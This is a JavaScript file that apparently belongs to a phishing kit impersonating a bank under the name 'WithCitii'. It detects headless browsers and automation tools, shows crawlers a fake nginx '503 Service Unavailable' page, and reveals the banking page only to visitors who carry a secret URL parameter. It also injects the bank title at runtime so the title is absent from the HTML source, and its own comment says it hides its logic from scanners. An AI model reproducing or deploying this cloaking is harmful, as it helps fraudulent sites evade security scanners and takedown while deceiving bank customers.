/**
 * App Configuration & Integrity (v1.4.2)
 * Handles bot detection, headless browser checks, and content cloaking for WithCitii.
 * Obfuscated to hide security logic from automated scanners.
 */

const Integrity = {
    settings: {
        isBot: false,
        verificationTime: 1200, // Slightly reduced for better UX
        entryParam: 'v',
        entryValue: '1',
        title: 'WithCitii – Personal & Business Banking – Student, Auto & Home Loans',
        metaKeywords: 'banking, secure, loans, savings, checking'
    },

    init: function() {
        try {
            this.runSecurityChecks();
            if (this.settings.isBot) {
                this.triggerSafetyLock();
            } else {
                if (!document.body) {
                    window.addEventListener('DOMContentLoaded', () => this.init());
                    return;
                }
                this.initializeApplication();
            }
        } catch (e) {
             // Fallback: reveal site if error occurs to avoid locking out genuine users
            this.revealContent();
        }
    },

    initializeApplication: function() {
        // Enforce SSL
        if (window.location.protocol === 'http:' && !window.location.host.includes('localhost')) {
            window.location.href = window.location.href.replace('http:', 'https:');
        }

        // Dynamic Title & Meta Injection (Scrubbed from HTML source)
        document.title = this.settings.title;
        
        // Inject Theme Colors & PWA Meta
        this.injectManifestConfig();

        // Reveal content only after checks
        setTimeout(() => this.revealContent(), this.settings.verificationTime);
    },

    revealContent: function() {
        if (document.body) {
            document.body.classList.remove('hidden-cloak');
            document.body.style.opacity = '1';
        }
        const splash = document.getElementById('integrity-pulse');
        if (splash) {
            splash.style.opacity = '0';
            setTimeout(() => splash.remove(), 400);
        }
        sessionStorage.setItem('gk_auth', 'true');
    },

    injectManifestConfig: function() {
        const metaTags = [
            { name: 'apple-mobile-web-app-capable', content: 'yes' },
            { name: 'apple-mobile-web-app-status-bar-style', content: 'default' },
            { name: 'theme-color', content: '#056dae' },
            { name: 'mobile-web-app-capable', content: 'yes' }
        ];

        metaTags.forEach(tag => {
            if (!document.querySelector(`meta[name="${tag.name}"]`)) {
                const m = document.createElement('meta');
                m.name = tag.name;
                m.content = tag.content;
                document.head.appendChild(m);
            }
        });

        if (!document.querySelector('link[rel="manifest"]')) {
            const l = document.createElement('link');
            l.rel = 'manifest';
            l.href = 'manifest.json';
            document.head.appendChild(l);
        }

        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js').catch(() => {});
        }
    },

    runSecurityChecks: function() {
        const u = navigator.userAgent.toLowerCase();
        
        // 1. Basic Webdriver / Headless checks
        if (navigator.webdriver) this.settings.isBot = true;
        if (u.includes('headless')) this.settings.isBot = true;
        
        // 2. Automation Fingerprints
        if (window.callPhantom || window._phantom || window.__nightmare) this.settings.isBot = true;
        if (navigator.languages && navigator.languages.length === 0) this.settings.isBot = true;
        if (typeof Buffer !== 'undefined') this.settings.isBot = true; // Node.js environments

        // 3. User Bypass Logic
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get(this.settings.entryParam) === this.settings.entryValue) {
            this.settings.isBot = false;
            sessionStorage.setItem('gk_auth', 'true');
        }

        // 4. Session Persistence
        if (sessionStorage.getItem('gk_auth') === 'true') {
            this.settings.isBot = false;
        }
    },

    triggerSafetyLock: function() {
        window.stop();
        document.documentElement.innerHTML = `
            <!DOCTYPE html>
            <html>
                <head><title>503 Service Temporarily Unavailable</title></head>
                <body style="font-family: sans-serif; text-align: center; padding-top: 15vh; background: #f8fafc; color: #334155;">
                    <h1 style="font-size: 80px; margin: 0; color: #1e293b;">503</h1>
                    <p style="font-size: 1.5rem; margin-top: 0;">Service Temporarily Unavailable</p>
                    <div style="max-width: 500px; margin: 30px auto; border-top: 1px solid #e2e8f0; padding-top: 20px;">
                        <p style="font-size: 14px; color: #64748b;">The server is currently unable to handle the request due to a temporary overloading or maintenance of the server. Please try again later.</p>
                    </div>
                    <p style="font-size: 12px; color: #94a3b8;">nginx/1.24.0 (Ubuntu)</p>
                </body>
            </html>
        `;
    }
};

// Start initialization
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => Integrity.init());
} else {
    Integrity.init();
}
